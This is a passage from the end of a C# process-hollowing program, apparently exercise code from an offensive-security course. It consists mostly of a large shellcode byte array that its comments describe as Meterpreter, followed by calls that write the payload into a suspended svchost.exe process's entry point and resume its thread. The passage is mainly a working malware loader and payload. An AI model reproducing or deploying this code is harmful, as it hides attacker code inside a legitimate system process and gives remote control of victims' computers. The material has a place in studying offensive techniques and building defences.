,0xca,0x38,0x58,0x99,0xf4,0xb1,0xb5,0xb0,0xf5,0x53,0xb0,0x8a,0xbc,0x9b,0x96,0x23,0x0f,0xba,0xcf,0x36,0xd4,0x85,0x7a,0xb4,0x8d,0x4d,0x35,0x10,0x73,0xe1,0x0c,0x52,0xab,0x01,0xa9,0x0c,0x9b,0x71,0x68,0xe1,0x22,0xcb,0x34,0xf4,0x1f,0x29,0x1a,0x8d,0x2f,0x4d,0x2e,0x0c,0x5a,0x99,0x9d,0x19,0x97,0xeb,0x87,0x82,0x2d,0x7f,0x01,0xdc,0xab,0x06,0x16,0x9f,0xdf,0x3f,0xca,0x6a,0x6b,0xfd,0x8a,0x1e,0x1c,0x72,0x3c,0x6a,0xb1,0x33,0xdd,0x08,0x02,0x72,0xff,0xc5,0x93,0xaa,0x5b,0x49,0xf7,0x5f,0xf5,0x5c,0x97,0xc3,0x0e,0xcf,0xdf,0x63,0x44,0x67,0x76,0x95,0x68,0xaa,0x48,0x44,0x7c,0xc2,0x85,0x10,0x70,0x18,0xd7,0x11,0x18,0xc0,0x93,0xe7,0x1b,0x59,0x35,0xc2,0xed,0x4f,0xe5,0x59,0x1e,0xc3,0x2d,0xad,0x5a,0x13,0x81,0x9f,0x3d,0x5a,0x82,0x6c,0xde,0xd3,0xe3,0x7d,0xff,0x26,0x84,0xd1,0xa8,0xca,0x03,0xa4,0x03,0xd0,0xf6,0x9f,0xd3,0xd1,0xea,0x73,0xd9,0x38,0xbc,0xf3,0x24,0xbf,0xfc,0x72,0x22,0x4e,0x98,0x73,0x3f,0xd2,0x3d,0x04,0x36,0x17,0xc6,0x20,0xd8,0x22,0xcd,0xd7,0x9b,0xe3,0x6e,0xb5,0x14,0x23,0x5b,0x4a,0x3d,0x6c,0x3d,0x0e,0xee,0x5b,0xba,0x98,0x61,0x32,0x3a,0x0a,0xf7,0x41,0x01,0x8e,0x1f,0x23,0x86,0x90,0x38,0x1b,0x15,0xbc,0x1d,0x8b,0xd2,0x6f,0x2d,0x02,0x00,0x4f,0xa5,0x60,0x6b,0x06,0x89,0x61,0xb3,0xe8,0x55,0x68,0xd0,0xf6,0x05,0xe3,0xb0,0x8d,0xb7,0xd8,0xd9,0x04,0xdb,0xad,0x7b,0xa9,0xab,0xc6,0x8b,0x22,0x92,0x15,0x3e,0xe8,0xb1,0x23,0xf7,0x51,0xab,0xc9,0x83,0x26,0xa5,0xac,0xcf,0xc5,0x36,0xfa,0x0d,0x02,0xa1,0xe0,0xe0,0x9e,0x31,0x87,0x88,0x5a,0xe0,0x51,0x72,0x3d,0xe2,0xe9,0x09,0x28,0x47,0x7c,0xe6,0x6c,0xf4,0x86,0x98,0xe9,0x8f,0x00,0x85,0x82,0x89,0xad,0xf7,0xa2,0x68,0x86,0xe4,0x1f,0xd9,0xd7,0xcd,0xdc,0xda,0x42,0x2d,0x1a,0x48,0xb8,0x22,0x2d,0xc3,0x5b,0xf1,0xe8,0x8e,0x0a,0x08,0x2b,0x62,0x85,0xee,0xa8,0xbf,0xd4,0xd3,0x51,0x6c,0x69,0xac,0x22,0x9e,0xaf,0xdd,0x01,0x20,0x22,0xac,0x82,0x91,0x79,0x13,0x93,0x2c,0x46,0x9c,0xd0,0x27,0x6e,0x09,0x8a,0x9c,0x2e,0x41,0x5c,0x31,0x7e,0x2e,0x13,0x7d,0x48,0xa0,0x86,0x82,0x37,0xa0,0x7c,0x10,0xef,0x15,0x36,0x73,0x43,0xe5,0x6f,0x3b,0x17,0x31,0xd7,0x39,0x6b,0x74,0xae,0x3d,0xa1,0x78,0xb3,0x37,0x39,0x51,0x0c,0xcb,0xa8,0x70,0x18,0xe6,0x69,0x01,0x99,0x94,0x56,0x43,0x6a,0x05,0x46,0xd5,0x92,0xe1,0x9a,0x42,0xaa,0x21,0x19,0x8e,0x70,0x5b,0xe2,0xb1,0xd1,0xdd,0xb1,0xbb,0x81,0x7e,0x1f,0xb4,0x47,0x5b,0x39,0x29,0x42,0xd4,0x61,0x04,0xf3,0x76,0xc1,0x71,0xc7,0x6e,0x27,0x48,0x8e,0x90,0xb6,0x19,0x9c,0xfd,0x0c,0xea,0x87,0x34,0xab,0xb6,0x68,0x67,0xbc,0x96,0xf5,0x84,0x48,0x84,0x51,0x1c,0x10,0x16,0xd3,0x7f,0xd5,0x1b,0x24,0xc5,0xb0,0x5d,0x4f,0xce,0xaf,0x03,0x2b,0x67,0x3e,0xc9,0xfe,0x49,0x99,0xa0,0x44,0x34,0xa1,0x3f,0x3c,0xcd,0x69,0x27,0xdc,0x18,0x4f,0x2e,0x5d,0x58,0x8d,0xd6,0xf5,0x59,0x7d,0xba,0x87,0x46,0x3e,0xad,0x70,0xf6,0x53,0x3d,0x77,0x47,0x01,0x4b,0x16,0x17,0x56,0x57,0x7d,0x49,0x14,0xa5,0x39,0xb6,0x0a,0x29,0x22,0x50,0x0f,0x5f,0xc6,0x01,0xa6,0xb7,0x33,0xf9,0x34,0xa9,0x7f,0xa6,0xfb,0x2d,0xa6,0x88,0x02,0x11,0x56,0x8f,0x4c,0xe1,0x77,0x69,0x4c,0x57,0x2b,0x3f,0x7e,0x11,0x72,0x29,0x2b,0x9b,0x66,0x7f,0xca,0x04,0x81,0xb7,0xf0,0x92,0xa1,0x36,0xcf,0xe4,0x1b,0xa6,0x4c,0xca,0x44,0x95,0x26,0x0a,0xb2,0x71,0x41,0x78,0x8e,0x72,0x10,0x87,0x86,0x95,0x38,0x64,0xeb,0xe8,0x90,0x78,0xdd,0x5d,0x13,0x7c,0xba,0x9a,0x81,0x84,0x67,0x33,0xce,0xb4,0x43,0x5b,0xa2,0x15,0xe5,0xd7,0xfe,0x92,0x05,0xa0,0x7a,0xf5,0xdb,0x93,0xb5,0xfa,0xd7,0x56,0x3b,0x3c,0xf3,0x27,0x59,0xbc,0x92,0x40,0xf3,0x65,0x9e,0x33,0xc5,0xd2,0xc5,0x9a,0xfd,0x79,0xcf,0xad,0x31,0xce,0x80,0xad,0xf7,0x89,0x31,0x4e,0xce,0xae,0x26,0xef,0xea,0xaf,0x53,0xd5,0x31,0x2d,0x11,0x1d,0x8f,0x78,0x7e,0x76,0xd4,0x05,0x03,0xa2,0x60,0x2a,0xa7,0xeb,0x1c,0x0f,0xbd,0x05,0xe4,0x98,0x79,0xb4,0xe7,0xae,0x06,0x4b,0xdb,0xb2,0xb6,0xff,0x72,0xe5,0x4c,0x79,0xca,0x4c,0xd6,0xeb,0xeb,0x68,0x43,0x40,0x84,0x65,0x17,0x69,0xc1,0x3a,0xdb,0xe0,0xe4,0xf8,0x8c,0x4e,0xe3,0x81,0xc4,0x52,0xe2,0x3a,0x10,0xe6,0x29,0x57,0x5f,0xfb,0xcb,0x6b,0x8e,0x73,0xae,0x62,0x20,0x98,0xd3,0x2d,0x59,0x6d,0x55,0x8b,0xd0,0x30,0x47,0xa4,0x1e,0x0f,0xfb,0x15,0xd3,0x4b,0x4b,0x13,0xcb,0x0f,0x69,0xe7,0x90,0xd3,0x5e,0x0d,0x6c,0x4d,0x8a,0xf9,0x92,0xd1,0x63,0xcd,0xc2,0x23,0xc6,0x85,0x67,0xee,0x29,0x38,0xc1,0xb5,0xae,0x0e,0x59,0xf0,0x41,0xf3,0x50,0x16,0x10,0x04,0xad,0x9d,0xae,0x21,0xd6,0x89,0x42,0x45,0xe6,0x94,0xab,0xa7,0xa1,0xee,0xca,0x92,0xfe,0xb9,0x6e,0xb3,0xec,0xf1,0x5b,0x61,0x39,0xab,0x1a,0x5f,0xca,0x0e,0x32,0xe4,0x4a,0xc4,0xf2,0x1d,0x20,0xf7,0xc9,0x0a,0xa5,0x71,0x24,0xd7,0x48,0x1c,0xac,0x92,0xfd,0x4a,0x88,0xbb,0x1d,0xba,0x61,0x6d,0x69,0xfd,0x41,0x61,0xca,0x88,0x48,0x47,0xab,0x5d,0x6d,0x6d,0x8b,0xc9,0x65,0x53,0x72,0x35,0x3d,0x2d,0x43,0xa1,0xeb,0x31,0x18,0xe0,0x0f,0x0b,0x7a,0x4a,0x92,0xb2,0x66,0x04,0xb0,0x3c,0x6e,0x7a,0xe0,0xc9,0x8c,0xed,0x1a,0xcb,0xb5,0xff,0x7f,0xc0,0xa9,0xd3,0xea,0xb9,0x08,0xcf,0x5f,0x57,0xb8,0x8f,0xc4,0x1d,0x8a,0xf2,0x92,0xa5,0x63,0x1b,0xe1,0x15,0x67,0x43,0x23,0x0c,0x3e,0x40,0x93,0x59,0x4b,0xef,0xba,0xcf,0xdb,0x90,0x72,0xce,0xb9,0x9c,0x83,0x28,0xa5,0x86,0xd9,0x83,0xc8,0xa0,0x75,0xb8,0x8b,0x10,0xc2,0xf4,0x66,0x0f,0x9d,0x78,0x07,0xf2,0x2a,0xd1,0x26,0xc4,0xf2,0xf5,0xd4,0x6b,0x77,0xd4,0x4f,0xd0,0x70,0xf7,0x41,0xf9,0x3a,0x9f,0xb2,0xf6,0x2c,0x6b,0x69,0x0c,0x16,0x42,0xbf,0xef,0x8b,0x0f,0x2b,0x63,0x31,0x72,0xb1,0x76,0x35,0xdc,0xca,0x99,0x1d,0xed,0xa2,0x91,0x28,0x8c,0xfc,0x95,0x8a,0x09,0x07,0x1a,0xad,0x26,0x47,0x96,0xb7,0xee,0x21,0xb0,0x9e,0xdf,0xff,0xa0,0x21,0x97,0xbf,0x11,0xae,0xc2,0xfd,0x15,0x6a,0x90,0xec,0xa9,0x51,0x2e,0x32,0x26,0xe4,0x6a,0xad,0xb7,0xb5,0xcf
            };


            //We have obtained the address of the EntryPoint so we can generate our Meterpreter shellcode
            //and use WriteProcessMemory to overwrite the existing code as shown in Listing 202.Remember
            //that we must add a DllImport statement for WriteProcessMemory before using it.
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            //When CreateProcessW started svchost.exe and populated the PROCESS_INFORMATION
            //structure, it also copied the handle of the main thread into it. 
            //We can then import ResumeThread and call it directly.
            ResumeThread(pi.hThread);
        }
    }
}
